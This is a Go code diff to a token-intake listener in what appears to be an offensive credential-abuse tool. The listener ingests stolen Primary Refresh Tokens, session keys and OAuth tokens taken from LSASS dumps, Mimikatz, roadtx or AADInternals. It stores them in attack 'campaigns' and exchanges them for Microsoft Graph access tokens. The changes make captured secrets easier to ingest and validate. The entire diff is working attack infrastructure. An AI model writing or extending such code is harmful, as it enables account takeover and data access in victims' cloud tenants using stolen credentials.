@@ -93,13 +93,14 @@ type tokenIntake struct {
 	// together with `session_key`. When `campaign_id` is present and a session
 	// key is available, the PRT is also exchanged for a Graph access token that
 	// is ingested into the campaign so it is usable in Graph Actions at once.
-	PRT          string `json:"prt"`
-	PRTToken     string `json:"prt_token"` // alias for prt
-	SessionKey   string `json:"session_key"`
-	DeviceCertID string `json:"device_cert_id"`
-	Label        string `json:"label"`
-	UPN          string `json:"upn"`
-	TenantID     string `json:"tenant_id"`
+	PRT           string `json:"prt"`
+	PRTToken      string `json:"prt_token"` // alias for prt
+	SessionKey    string `json:"session_key"`
+	SessionKeyAlt string `json:"sessionkey"` // alias emitted by roadtx / some LSASS dumps
+	DeviceCertID  string `json:"device_cert_id"`
+	Label         string `json:"label"`
+	UPN           string `json:"upn"`
+	TenantID      string `json:"tenant_id"`
 	// Exchange controls (optional). ClientID/Resource default to Office/Graph.
 	ExClientID string `json:"client_id"`
 	ExResource string `json:"resource"`
@@ -160,6 +161,16 @@ func (t tokenIntake) isPRTCookie() bool { return t.prtCookie() != "" }
 // by cutting at the first ';' and trimming surrounding whitespace.
 func stripCookieAttrs(s string) string {
 	return strings.TrimSpace(strings.SplitN(s, ";", 2)[0])
+}
+
+// cleanKeyMaterial strips wrapping quotes and surrounding whitespace from a
+// captured secret. Capture tools and copy-paste routinely wrap the value in
+// quotes or leave a trailing newline; the raw value is stored and only decoded
+// (hex or base64) at use time, so it must be clean going in.
+func cleanKeyMaterial(s string) string {
+	s = strings.TrimSpace(s)
+	s = strings.Trim(s, `"'`)
+	return strings.TrimSpace(s)
 }
 
 func (tl *TokenListener) SetDefaultCampaign(id string) {
@@ -377,6 +388,16 @@ func (tl *TokenListener) ingestPRT(w http.ResponseWriter, r *http.Request, in to
 		"label":           label,
 		"has_session_key": in.SessionKey != "",
 	}
+	// Validate the session key encoding up front so the operator gets immediate
+	// feedback instead of an opaque failure at first exchange. hex (Mimikatz /
+	// LSASS) and base64 (roadtx / AADInternals) are both accepted on use.
+	if in.SessionKey != "" {
+		if kb, kerr := prtpkg.DecodeKeyMaterial(in.SessionKey); kerr != nil {
+			resp["session_key_warning"] = "session key is not decodable as hex or base64; PRT cannot mint tokens until re-ingested with a valid session key"
+		} else {
+			resp["session_key_bytes"] = len(kb)
+		}
+	}
 	outcome := "prt_stored"
 
 	// Optional auto-exchange: PRT → Graph access token → ingest into campaign.
@@ -549,7 +570,7 @@ func parseTokenIntake(r *http.Request) (tokenIntake, error) {
 		in.Source = r.PostForm.Get("source")
 		in.PRT = r.PostForm.Get("prt")
 		in.PRTToken = r.PostForm.Get("prt_token")
-		in.SessionKey = r.PostForm.Get("session_key")
+		in.SessionKey = pickNonEmpty(r.PostForm.Get("session_key"), r.PostForm.Get("sessionkey"))
 		in.DeviceCertID = r.PostForm.Get("device_cert_id")
 		in.Label = r.PostForm.Get("label")
 		in.UPN = r.PostForm.Get("upn")
@@ -566,6 +587,12 @@ func parseTokenIntake(r *http.Request) (tokenIntake, error) {
 			return in, fmt.Errorf("invalid JSON body")
 		}
 	}
+	// Normalize captured secrets: fold the sessionkey alias in and strip wrapping
+	// quotes / whitespace from PRT material so a copy-pasted or tool-wrapped value
+	// stores clean and decodes on use.
+	in.SessionKey = cleanKeyMaterial(pickNonEmpty(in.SessionKey, in.SessionKeyAlt))
+	in.PRT = cleanKeyMaterial(in.PRT)
+	in.PRTToken = cleanKeyMaterial(in.PRTToken)
 	if !in.isPRT() && !in.isPRTCookie() && in.AccessToken == "" && in.RefreshToken == "" && in.IDToken == "" {
 		return in, fmt.Errorf("payload must carry a prt, a prt_cookie (x-ms-RefreshTokenCredential), or at least one of access_token, refresh_token, id_token")
 	}
